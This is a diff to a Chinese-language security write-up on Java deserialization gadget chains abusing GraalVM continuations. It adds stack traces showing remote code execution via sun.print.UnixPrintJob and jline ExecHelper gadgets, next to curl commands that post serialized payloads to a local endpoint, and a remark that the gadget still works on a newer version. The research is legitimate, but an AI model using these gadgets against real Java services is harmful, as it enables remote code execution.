@@ -868,6 +868,23 @@ curl --noproxy '*' -X POST --data-binary @unix.ser http://127.0.0.1:8000/coffee
 
 ![](assets/002.png)
 
+调用栈
+
+```
+java.lang.Exception: RCE
+at java.base/java.lang.ProcessImpl.forkAndExec(Native Method)
+at java.base/java.lang.ProcessImpl.<init>(ProcessImpl.java:295)
+at java.base/java.lang.ProcessImpl.start(ProcessImpl.java:225)
+at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1126)
+at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1089)
+at java.base/java.lang.Runtime.exec(Runtime.java:681)
+at java.base/java.lang.Runtime.exec(Runtime.java:530)
+at java.desktop/sun.print.UnixPrintJob$PrinterSpooler.run(UnixPrintJob.java:986)
+at org.graalvm.continuations.ContinuationImpl.resume0(Native Method)
+at org.graalvm.continuations.ContinuationImpl.resume(ContinuationImpl.java:369)
+at org.example.poc.Unix.main(Unix.java:67)
+```
+
 调试的时候也用了最新版的 25.x ，发现 `printExecCmd` 前面多了指令，367 变成 `aload 6`，resume 报 `Target bci is not a valid bytecode`。`println()` 在 421，数组长度 15 改 21，也就是说这条 gadget 依旧可用。
 
 ```
@@ -959,4 +976,20 @@ curl --noproxy '*' -X POST --data-binary @jline.ser http://127.0.0.1:8000/coffee
 ```
 
 ![](assets/003.png)
+
+调用栈
+
+```
+java.lang.Exception: RCE
+at java.base/java.lang.ProcessImpl.forkAndExec(Native Method)
+at java.base/java.lang.ProcessImpl.<init>(ProcessImpl.java:295)
+at java.base/java.lang.ProcessImpl.start(ProcessImpl.java:225)
+at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1126)
+at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1089)
+at jdk.internal.le/jdk.internal.org.jline.utils.ExecHelper.exec(ExecHelper.java:42)
+at jdk.internal.le/jdk.internal.org.jline.terminal.impl.ExecPty.current(ExecPty.java:42)
+at org.graalvm.continuations.ContinuationImpl.resume0(Native Method)
+at org.graalvm.continuations.ContinuationImpl.resume(ContinuationImpl.java:369)
+at org.example.poc.Jline.main(Jline.java:70)
+```
 
